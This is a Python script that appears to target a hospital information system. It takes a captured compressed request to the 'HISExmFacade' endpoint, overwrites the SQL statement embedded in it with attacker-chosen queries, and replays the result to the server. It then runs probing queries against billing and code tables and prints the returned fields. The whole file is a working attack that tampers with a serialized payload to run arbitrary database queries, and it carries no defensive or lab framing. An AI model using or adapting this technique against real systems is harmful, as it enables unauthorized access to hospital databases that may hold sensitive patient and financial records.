from his_client_final import HISClient
import re, zlib, sys, json

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding='utf-8')

c = HISClient()

# Try to query price from PFKEY using EXM
def execute_sql(sql_query):
    import os
    template_path = "HISExmFacade_payload_0.bin"
    if not os.path.exists(template_path): return None
    with open(template_path, "rb") as f:
        compressed_template = f.read()
    try: decompressed = zlib.decompress(compressed_template)
    except: decompressed = compressed_template
    original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
    target_len = len(original_sql_bytes)
    if len(sql_query) > target_len:
        print(f"[-] SQL too long: {len(sql_query)} > {target_len}")
        return None
    padded_sql = sql_query.ljust(target_len)
    patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
    import requests
    final_payload = zlib.compress(patched_payload)
    resp = requests.post(f"{c.base_url}/HISExmFacade", data=final_payload, headers=c.headers)
    if resp.status_code == 200:
        dec = zlib.decompress(resp.content)
        return dec.decode('utf-8', errors='ignore')
    return None

# Query for a known material code to check if PFCODE table has pricing
# First try a common material fee table
queries = [
    "SELECT * FROM OPDUSR.ORMPF WHERE PFKEY = 'M40015036'",
    "SELECT * FROM BASCODE WHERE PFKEY = 'M40015036'",
    "SELECT * FROM PFCODE WHERE PFKEY LIKE 'M%' AND ROWNUM <= 3",
]

for q in queries:
    print(f"\n--- Query: {q} ---")
    result = execute_sql(q)
    if result and '<NewDataSet>' in result:
        # Extract tags
        rows = re.findall(r'<DRMODIFY[^>]*>(.*?)</DRMODIFY>', result, re.DOTALL)
        if rows:
            for row in rows[:2]:
                tags = re.findall(r'<(\w+)>(.*?)</\1>', row)
                print(f"  Fields: {[(t[0], t[1][:50]) for t in tags]}")
        else:
            print("  No rows found.")
    elif result:
        print(f"  Response (no NewDataSet): {result[:200]}...")
    else:
        print("  No response.")
